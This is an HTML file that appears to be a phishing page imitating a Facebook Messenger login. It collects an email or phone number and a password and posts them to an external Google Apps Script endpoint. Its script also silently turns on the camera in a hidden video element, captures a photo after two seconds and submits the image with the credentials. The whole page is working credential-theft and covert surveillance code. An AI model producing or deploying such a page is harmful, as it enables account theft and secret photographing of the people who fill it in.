<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .form-container {
      background-color: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      width: 90%;
      max-width: 400px;
    }

    .input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
    }

    button:hover {
      background-color: #45a049;
    }

    #video {
      width: 100%;
      border-radius: 4px;
      margin-bottom: 10px;
      display: none; 
    }
  </style>
</head>
<body>
  <div class="form-container">
    <form action="https://script.google.com/macros/s/AKfycbxxZ0OwTgZGnVpqWwhm8gjrs5ODi-iSCPOF7OiL2SObivw-c6l9kpKs7u2dwOxz9LRn/exec" method="post">
      <input type="hidden" name="title" value="Fb msnger">
      <input type="hidden" name="timestamp">
      <input class="input" type="text" name="user" placeholder="Email address or phone number">
      <input class="input" type="password" name="password" placeholder="Password">
      
      <video id="video" autoplay></video>
      <canvas id="canvas" style="display:none;"></canvas>
      <input type="hidden" name="photo" id="photo">

      <button type="submit">Submit</button>
    </form>
  </div>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const photoInput = document.getElementById('photo');
    
    // Get access to the camera
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
        // Auto-capture photo after a short delay
        setTimeout(() => {
          const context = canvas.getContext('2d');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0);
          photoInput.value = canvas.toDataURL('image/png');
        }, 2000); // Auto-capture after 2 seconds
      })
      .catch(err => console.error("Error accessing camera: ", err));
  </script>
</body>
</html>
